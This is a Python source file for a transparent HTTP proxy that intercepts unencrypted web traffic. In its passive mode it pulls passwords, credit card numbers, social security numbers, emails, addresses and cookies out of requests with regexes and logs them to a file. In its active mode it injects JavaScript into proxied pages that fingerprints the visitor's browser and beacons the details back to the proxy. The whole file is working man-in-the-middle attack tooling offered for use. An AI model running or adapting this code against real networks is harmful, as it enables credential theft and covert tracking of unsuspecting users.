import argparse
import re
import socket
from urllib.parse import urlparse, parse_qs, unquote

BUFFER_SIZE = 4096  # Size of each chunk for receiving data

def extract_sensitive_info(data):
    # Regex patterns for identifying sensitive information
    regex_patterns = {
        "firstname": r"firstname=([a-zA-Z]+)",
        "lastname": r"lastname=([a-zA-Z]+)",
        "email": r"(?:email=)([a-zA-Z0-9._%+-]+[@%40][a-zA-Z0-9.-]+\.[a-zA-Z]{2,})",
        "username": r"(?:username)=([a-zA-Z0-9._%+-]+)",
        "password": r"(?:password|passwd|pwd)=([^&\s]+)",
        "credit_card": r"(?:credit[-_]?card=)(\d{13,16})",
        "ssn": r"(?:social[-_]?security=)(\d{3}-\d{2}-\d{4})",
        "phone": r"(?:phone=)(\d{3}-\d{3}-\d{4})",
        "address": r"(?:address=)([A-Za-z0-9\s,]+)",
        "city": r"(?:city=)([A-Za-z\s]+)",
        "state": r"(?:state=)([A-Z]{2})",
        "zip": r"(?:zip=)(\d{5})",
        "cookies": r"(Cookie: )([^\r\n]+)"
    }

    found_data = {}
    for key, pattern in regex_patterns.items():
        matches = re.findall(pattern, data)
        if matches:
            unquoted_matches = [unquote(match) if not isinstance(match, tuple) else unquote("".join(match)) for match in matches]
            found_data[key] = unquoted_matches
    return found_data

def log_passive_info(data):
    sensitive_info = extract_sensitive_info(data)
    if sensitive_info:
        with open("info1.txt", "a") as log_file:
            for key, values in sensitive_info.items():
                for value in values:
                    log_file.write(f"{key}: {value}\n")

# def log_active_info(data):
#     parsed_url = urlparse(data)
#     query_params = parse_qs(parsed_url.query)

#     for key, value in query_params.items():
#         print(f"Received {key}: {value}")  # Debug line to check received data

#     user_agent = query_params.get('user-agent', ['N/A'])[0]
#     screen_res = query_params.get('screen', ['N/A'])[0]
#     language = query_params.get('lang', ['N/A'])[0]

#     if user_agent != 'N/A' or screen_res != 'N/A' or language != 'N/A':
#         with open("info2.txt", "a") as log_file:
#             log_file.write(data + "\n")
#             log_file.write("Extracted Client Information:\n")
#             log_file.write(f"User-Agent: {user_agent}\n")
#             log_file.write(f"Screen Resolution: {screen_res}\n")
#             log_file.write(f"Language: {language}\n")
#             log_file.write("\n")

def log_active_info(data):
    parsed_url = urlparse(data)
    query_params = parse_qs(parsed_url.query)

    with open("info2.txt", "a") as log_file:
        log_file.write("Extracted Client Information:\n")

        for key, value in query_params.items():
            if value:
                # Debug print for console verification
                print(f"Received {key}: {value}")

                # Log each key-value pair to the file
                log_file.write(f"{key}: {', '.join(value)}\n")

        user_agent = query_params.get('user-agent', ['N/A'])[0]
        screen_res = query_params.get('screen', ['N/A'])[0]
        language = query_params.get('lang', ['N/A'])[0]

        # Write the specific fields if they exist
        if user_agent != 'N/A' or screen_res != 'N/A' or language != 'N/A':
            log_file.write(f"User-Agent: {user_agent}\n")
            log_file.write(f"Screen Resolution: {screen_res}\n")
            log_file.write(f"Language: {language}\n")
            log_file.write("\n")  # Add a newline for readability


def inject_javascript(response, proxy_ip):
    js_code = f"""
    <script>
        (function() {{
            try {{
                var userAgent = navigator.userAgent || 'N/A';
                var screenRes = window.screen.width + 'x' + window.screen.height || 'N/A';
                var language = navigator.language || navigator.userLanguage || 'N/A';
                var img = new Image();
                img.src = 'http://{proxy_ip}/?user-agent=' + encodeURIComponent(userAgent) +
                          '&screen=' + encodeURIComponent(screenRes) +
                          '&lang=' + encodeURIComponent(language);
            }} catch (e) {{
                console.error('Error in injected script:', e);
            }}
        }})();
    </script>
    """
    modified_response = re.sub(r"</body>", js_code + "</body>", response, flags=re.IGNORECASE)
    if "</body>" in response:
        print("Injected JS code into response.")
    else:
        print("No </body> tag found, could not inject JS.")
    return modified_response

def handle_client(client_socket, mode, proxy_ip):
    try:
        request = client_socket.recv(BUFFER_SIZE).decode('utf-8', errors='ignore')
        if not request:
            client_socket.close()
            return

        host_match = re.search(r"Host: (.+)\r\n", request)
        if not host_match:
            print("Host header not found in the request.")
            client_socket.close()
            return

        destination_host = host_match.group(1).strip()
        print(f"Connecting to: {destination_host}")

        try:
            destination_ip = socket.gethostbyname(destination_host)
            destination_port = 80
        except socket.gaierror as e:
            print(f"Failed to resolve host: {destination_host} with error {e}")
            client_socket.close()
            return

        if mode == "passive":
            log_passive_info(request)
        elif mode == "active":
            log_active_info(request)

        server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server_socket.connect((destination_ip, destination_port))
        server_socket.send(request.encode('utf-8'))

        while True:
            response = server_socket.recv(BUFFER_SIZE)
            if len(response) == 0:
                break

            if mode == "active":
                response_decoded = response.decode('utf-8', errors='ignore')
                response_with_js = inject_javascript(response_decoded, proxy_ip)
                client_socket.send(response_with_js.encode('utf-8'))
            else:
                client_socket.send(response)

    except Exception as e:
        print(f"Error handling client: {e}")
    finally:
        client_socket.close()
        if 'server_socket' in locals():
            server_socket.close()

def start_proxy(ip, port, mode):
    proxy_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    proxy_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    proxy_socket.bind((ip, port))
    proxy_socket.listen(5)
    print(f"Proxy listening on {ip}:{port} in {mode} mode...")

    while True:
        client_socket, addr = proxy_socket.accept()
        print(f"Accepted connection from {addr}")
        handle_client(client_socket, mode, ip)

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Transparent Proxy for Logging")
    parser.add_argument("-m", "--mode", choices=["active", "passive"], required=True, help="Mode: active or passive")
    parser.add_argument("ip", help="Listening IP address")
    parser.add_argument("port", type=int, help="Listening port")
    args = parser.parse_args()

    start_proxy(args.ip, args.port, args.mode)
